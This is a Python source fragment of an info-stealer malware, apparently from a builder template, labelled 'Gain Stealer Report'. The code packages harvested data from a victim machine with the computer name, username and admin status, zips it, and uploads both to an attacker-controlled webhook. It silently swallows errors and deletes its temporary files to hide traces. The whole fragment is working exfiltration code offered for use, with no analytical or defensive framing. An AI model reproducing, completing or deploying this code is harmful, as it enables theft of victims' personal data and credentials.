def package_and_send_data():
    temp_dir = tempfile.gettempdir()
    data_dir = os.path.join(temp_dir, f'SystemData_{__import__("random").randint(10000, 99999)}')
    os.makedirs(data_dir, exist_ok=True)
    
    data = {}
    
{FEATURE_CONDITIONS}

    # Create summary
    summary = {
        'timestamp': time.time(),
        'computer_name': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'admin': is_admin(),
        'data_collected': {k: len(v) for k, v in data.items()}
    }
    
    with open(os.path.join(data_dir, 'summary.json'), 'w', encoding='utf-8') as f:
        json.dump(summary, f, indent=2)
    
    # Create ZIP
    zip_path = os.path.join(temp_dir, 'system_data.zip')
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(data_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, data_dir)
                    zipf.write(file_path, arcname)
        
        # Send to webhook
        send_to_webhook(zip_path, summary)
        
    except Exception as e:
        pass
    
    # Cleanup
    try:
        shutil.rmtree(data_dir, ignore_errors=True)
        if os.path.exists(zip_path):
            os.remove(zip_path)
    except:
        pass

def send_to_webhook(zip_path, summary):
    try:
        # Create embed
        embed = {
            'title': 'Gain Stealer Report',
            'color': 0x00ff00,
            'fields': [],
            'timestamp': __import__('datetime').datetime.now().isoformat()
        }
        
        # Add data counts
        for key, value in summary.get('data_collected', {}).items():
            embed['fields'].append({
                'name': key.replace('_', ' ').title(),
                'value': str(value),
                'inline': True
            })
        
        # Add system info
        embed['fields'].extend([
            {'name': 'Computer', 'value': summary.get('computer_name', 'Unknown'), 'inline': True},
            {'name': 'User', 'value': summary.get('username', 'Unknown'), 'inline': True},
            {'name': 'Admin', 'value': str(summary.get('admin', False)), 'inline': True},
            {'name': 'Zip Password', 'value': '1234', 'inline': True}
        ])
        
        # Send embed
        payload = {
            'username': 'System Report',
            'embeds': [embed]
        }
        
        requests.post(WEBHOOK_URL, json=payload)
        
        # Send ZIP file
        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
            with open(zip_path, 'rb') as f:
                files = {'file': ('system_data.zip', f, 'application/zip')}
                requests.post(WEBHOOK_URL, files=files)
        
        return True
        
    except Exception as e:
        return False